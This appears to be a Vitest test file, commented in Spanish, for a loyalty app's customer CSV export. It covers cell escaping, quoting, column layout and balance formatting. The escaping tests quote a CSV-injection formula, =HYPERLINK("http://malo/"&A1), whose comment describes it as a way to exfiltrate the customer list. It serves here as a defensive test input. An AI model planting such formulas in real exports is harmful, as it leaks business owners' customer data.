import { describe, it, expect, afterEach } from 'vitest';
import { createServiceClient } from '../supabase/server';
import { crearEntorno } from '../../test/fixtures/entornoComercio';
import { crearPrograma } from './programas';
import { renovarMembresia } from '../tarjetas/vigencia';
import { escaparCelda, generarCsv, filasParaExportar } from './exportarClientes';

// Dos mitades: el formateador PURO (lo que rompe un CSV en la práctica) y el RECORRIDO contra la
// base, que es donde se decide en qué unidad va cada saldo. La segunda existe porque la primera,
// sola, pasaba en verde con la consulta mandando el entero crudo — ver el comentario de su bloque.

describe('escaparCelda', () => {
  it('neutraliza las celdas que Excel ejecutaría como fórmula', () => {
    // CSV injection. El archivo lo abre el DUEÑO en su computadora, confiando en él, así que una
    // celda como =HYPERLINK("http://malo/"&A1) convierte su propio export en un exfiltrador de su
    // base de clientes. El apóstrofo le dice a Excel "esto es texto" y no se muestra.
    expect(escaparCelda('=1+1')).toBe('"\'=1+1"');
    expect(escaparCelda('=HYPERLINK("http://malo/")')).toBe('"\'=HYPERLINK(""http://malo/"")"');
    expect(escaparCelda('+34600000000')).toBe('"\'+34600000000"');
    expect(escaparCelda('-2')).toBe('"\'-2"');
    expect(escaparCelda('@usuario')).toBe('"\'@usuario"');
  });

  it('no toca un nombre normal', () => {
    expect(escaparCelda('José Pérez')).toBe('"José Pérez"');
  });

  it('duplica las comillas dobles, como manda RFC 4180', () => {
    expect(escaparCelda('Juan "el Flaco"')).toBe('"Juan ""el Flaco"""');
  });

  it('entrecomilla siempre, aunque no haya comas', () => {
    // Un campo entrecomillado de más es válido; uno de menos corre TODAS las columnas cuando el
    // nombre trae una coma. Se prefiere el error inofensivo.
    expect(escaparCelda('Ana')).toBe('"Ana"');
    expect(escaparCelda('Pérez, Ana')).toBe('"Pérez, Ana"');
  });

  it('sobrevive a saltos de línea dentro de un campo', () => {
    expect(escaparCelda('linea1\nlinea2')).toBe('"linea1\nlinea2"');
  });

  it('trata null, undefined y vacío como celda vacía', () => {
    expect(escaparCelda(null)).toBe('""');
    expect(escaparCelda(undefined)).toBe('""');
    expect(escaparCelda('')).toBe('""');
  });

  it('convierte números sin marcarlos como peligrosos', () => {
    expect(escaparCelda(0)).toBe('"0"');
    expect(escaparCelda(42)).toBe('"42"');
    // Un número NEGATIVO sí empieza con '-', así que se escapa. Es feo pero correcto: preferimos un
    // apóstrofo visible en un caso rarísimo (un saldo negativo no debería existir) antes que dejar
    // pasar el vector.
    expect(escaparCelda(-1)).toBe('"\'-1"');
  });
});

describe('generarCsv', () => {
  it('arma encabezado y filas separados por CRLF', () => {
    // CRLF y no LF: es lo que dice RFC 4180 y lo que Excel en Windows espera.
    const csv = generarCsv([
      { nombre: 'Ana', apellido: 'Rivera', telefono: '+50377771234', tarjeta: 'Principal', saldo: '3 sellos', visitas: 5, alta: '2026-07-01' },
    ]);
    const lineas = csv.split('\r\n');
    expect(lineas).toHaveLength(2);
    // "Apellido" en su propia columna, justo después de "Nombre" (0036). Aparte y no unido al nombre:
    // el dueño que ordena o filtra la hoja por apellido necesita la columna sola.
    expect(lineas[0]).toBe('"Nombre","Apellido","Teléfono","Tarjeta","Saldo","Visitas","Cliente desde"');
    // El teléfono sale con apóstrofo, y eso es CORRECTO, no un efecto colateral: todo teléfono
    // canónico empieza con '+' y cae en el escape. En Excel y Google Sheets el apóstrofo inicial es
    // un marcador de "esto es texto" que NO se muestra — y es justamente lo que evita que Excel
    // convierta +50377771234 en el número 50377771234 y se coma el signo. Sin él, la columna más
    // importante del export llegaría mutilada.
    expect(lineas[1]).toBe(`"Ana","Rivera","'+50377771234","Principal","3 sellos","5","2026-07-01"`);
  });

  it('un cliente sin apellido deja la celda vacía, sin correr las columnas', () => {
    // Todo cliente registrado antes de la 0036 tiene el apellido en null. La celda vacía mantiene
    // el teléfono bajo "Teléfono".
    const csv = generarCsv([
      { nombre: 'Ana López', apellido: '', telefono: '+50377771234', tarjeta: 'Principal', saldo: '3 sellos', visitas: 5, alta: '2026-07-01' },
    ]);
    expect(csv.split('\r\n')[1]).toBe(`"Ana López","","'+50377771234","Principal","3 sellos","5","2026-07-01"`);
  });

  it('con cero clientes deja solo el encabezado', () => {
    // Un archivo vacío del todo le haría pensar al dueño que la descarga falló.
    expect(generarCsv([]).split('\r\n')).toHaveLength(1);
  });

  it('una fila con una coma en el nombre no corre las columnas', () => {
    const csv = generarCsv([
      { nombre: 'Pérez, Ana', apellido: 'Gómez, hija', telefono: '+50370000000', tarjeta: 'Principal', saldo: '1 sello', visitas: 1, alta: '2026-07-01' },
    ]);
    // Siete campos entrecomillados: si el escape fallara, el nombre y el apellido partirían la fila
    // en nueve.
    expect(csv.split('\r\n')[1].match(/","/g)).toHaveLength(6);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// La unidad y el programa en el CSV (2026-08-07)
// ─────────────────────────────────────────────────────────────────────────────
// El export mandaba `puntos_actuales` crudo bajo una columna llamada "Saldo", sin unidad. Es el
// mismo defecto que ya se cerró en el pase, el escáner, los reportes y el portal — pero acá el
// archivo lo abre el DUEÑO en su computadora y toma decisiones de negocio con él.
describe('el CSV dice en qué moneda está cada saldo', () => {
  it('un saldo en dinero se lee en dólares, no como un entero pelado', () => {
    // 1250 en la columna son $12.50. Exportar "1250" bajo el título "Saldo" no es ambiguo: es
    // falso, y por un factor de cien.
    const csv = generarCsv([
      { nombre: 'Ana', apellido: 'Rivera', telefono: '+50377771234', tarjeta: 'Gift card', saldo: '$12.50', visitas: 2, alta: '2026-07-01' },
    ]);
    expect(csv.split('\r\n')[1]).toContain('$12.50');
  });

  it('cada fila dice a QUÉ tarjeta pertenece', () => {
    // Un comercio puede tener dos programas activos a la vez. Sin esta columna, la fila de alguien
    // con 8 sellos y la de alguien con $8.00 de saldo se ven idénticas en la hoja de cálculo.
    const csv = generarCsv([
      { nombre: 'Ana', apellido: 'Rivera', telefono: '+50377771234', tarjeta: 'Sellos del café', saldo: '8 sellos', visitas: 8, alta: '2026-07-01' },
    ]);
    const lineas = csv.split('\r\n');
    expect(lineas[0]).toContain('Tarjeta');
    expect(lineas[1]).toContain('Sellos del café');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// El RECORRIDO, contra la base real
// ─────────────────────────────────────────────────────────────────────────────
// Las pruebas de arriba son del formateador puro y NO alcanzan: se las alimenta con un saldo ya
// formateado, así que pasan igual aunque `filasParaExportar` mande el entero crudo. Se comprobó con
// una mutación —reemplazar describirCosto por String(puntos_actuales) las dejó las 12 en verde— y
// por eso existe este bloque. El defecto vive en la CONSULTA, no en el formateador.
describe('filasParaExportar (contra la base)', () => {
  const supabase = createServiceClient();
  const entorno = crearEntorno(supabase);

  afterEach(async () => {
    await entorno.limpiar();
  });

  it('un saldo en centavos sale en dólares, y la fila dice de qué tarjeta es', async () => {
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'gift_card' });
    // 1250 en la columna son $12.50.
    await entorno.crearTarjeta(comercioId, 1250);

    const filas = await filasParaExportar(supabase, comercioId);

    expect(filas).toHaveLength(1);
    // "disponibles" y no "$12.50" a secas desde el 2026-09-08: el saldo lo arma `describirFila`,
    // el MISMO formateador que ve el cliente en su billetera y el dueño en Clientes. Que el CSV
    // hable distinto que la pantalla es justo lo que hace dudar de cuál de los dos miente.
    expect(filas![0].saldo, 'exportó el entero crudo: $12.50 se lee como 1250').toBe('$12.50 disponibles');
    expect(filas![0].tarjeta.length, 'la fila no dice a qué tarjeta pertenece').toBeGreaterThan(0);
  });

  it('en sellos sale contado en sellos', async () => {
    // La otra mitad: si TODO saliera formateado como dinero, la prueba de arriba pasaría igual.
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    await entorno.crearTarjeta(comercioId, 8);

    const filas = await filasParaExportar(supabase, comercioId);

    expect(filas![0].saldo).toBe('8 sellos');
  });

  it('el apellido sale en su columna, y vacío en un cliente que no lo tiene', async () => {
    // Por el recorrido y no por `generarCsv`: la prueba del encabezado pasa aunque la CONSULTA no
    // traiga el apellido, porque se la alimenta con la fila ya armada.
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    const { id: conApellido } = await entorno.crearTarjeta(comercioId, 1);
    await entorno.crearTarjeta(comercioId, 2);
    // El fixture crea clientes sin apellido (como los anteriores a la 0036); a uno se le pone acá.
    // El registro que lo guarda al crear el cliente es de otra tarea y tiene sus propias pruebas.
    const { data: tarjeta, error: eT } = await supabase
      .from('tarjetas')
      .select('cliente_id')
      .eq('id', conApellido)
      .single();
    if (eT) throw eT;
    const { error: eU } = await supabase.from('clientes').update({ apellido: 'Rivera' }).eq('id', tarjeta.cliente_id);
    if (eU) throw eU;

    const filas = await filasParaExportar(supabase, comercioId);

    // MUTACIÓN (2026-09-17): sacar `apellido` del select de `filasParaExportar` (dejándolo en
    // `clientes(nombre, telefono)`) hace fallar esta prueba con
    // "expected [ '', '' ] to deeply equal [ '', 'Rivera' ]": la columna sale vacía para todos
    // aunque el cliente tenga apellido.
    // Ordenado y no por posición: las dos tarjetas nacen en el mismo milisegundo a veces.
    expect((filas ?? []).map((f) => f.apellido).sort()).toEqual(['', 'Rivera']);
  });

  // ───────────────────────────────────────────────────────────────────────────
  // Los tres tipos SIN contador (2026-09-08)
  // ───────────────────────────────────────────────────────────────────────────
  // El export formateaba el saldo con `describirCosto`, que está pensada para COSTOS y devuelve
  // cadena VACÍA cuando el tipo no cuenta enteros (cupón, membresía y descuento: su estado es una
  // fecha o un nivel, no un número). O sea que el dueño de un gimnasio descargaba su base y la
  // columna "Saldo" venía vacía para TODOS sus socios — justo el dato por el que abre el archivo.
  //
  // El arreglo es el mismo de siempre: `describirFila` + `COLUMNAS_ESTADO`, que viajan juntas para
  // que el `select` no pueda quedarse corto (le faltaban vigencia_hasta, usado_en y
  // acumulado_centavos).
  it('una membresía exporta hasta cuándo está activa, no una celda vacía', async () => {
    // La configuración se carga con `crearPrograma()` —la MISMA función que usa la pantalla
    // Programas— y el comercio queda con sus columnas legadas vacías. Es la única forma de que la
    // prueba mida lo que vive el dueño (ver el encabezado de lib/tarjetas/tiposFuncionales.test.ts).
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    const programa = await crearPrograma(supabase, comercioId, {
      nombre: 'Socios',
      tipoTarjeta: 'membresia',
      cashbackPorcentaje: null,
      multipassVisitas: null,
      membresiaDias: 30,
      cuponVigenciaDias: null,
    });
    if (!programa.ok) throw new Error(`no se pudo crear el programa de membresía: ${programa.error}`);
    const { id: tarjetaId } = await entorno.crearTarjeta(comercioId, 0, { programaId: programa.id });
    // La vigencia la escribe el camino de PRODUCCIÓN (el RPC de renovación), no un insert a mano:
    // así la fecha que termina en el CSV es la misma que ve el socio en su billetera.
    const renovacion = await renovarMembresia(supabase, comercioId, tarjetaId);
    expect(renovacion.ok, renovacion.ok ? '' : renovacion.error).toBe(true);

    const filas = await filasParaExportar(supabase, comercioId);
    const fila = (filas ?? []).find((f) => f.tarjeta === 'Socios');

    // MUTACIÓN (2026-09-08): volver la línea del saldo de `filasParaExportar` a
    // `describirCosto(programa?.tipoTarjeta ?? 'puntos', t.puntos_actuales)` deja esta celda VACÍA
    // y esta prueba falla con "expected '' to match /^Activa hasta el /". Es exactamente la línea
    // que la prueba dice proteger.
    expect(
      fila?.saldo,
      'la columna Saldo salió vacía: el socio no sabe hasta cuándo está activo',
    ).toMatch(/^Activa hasta el /);
  });
});
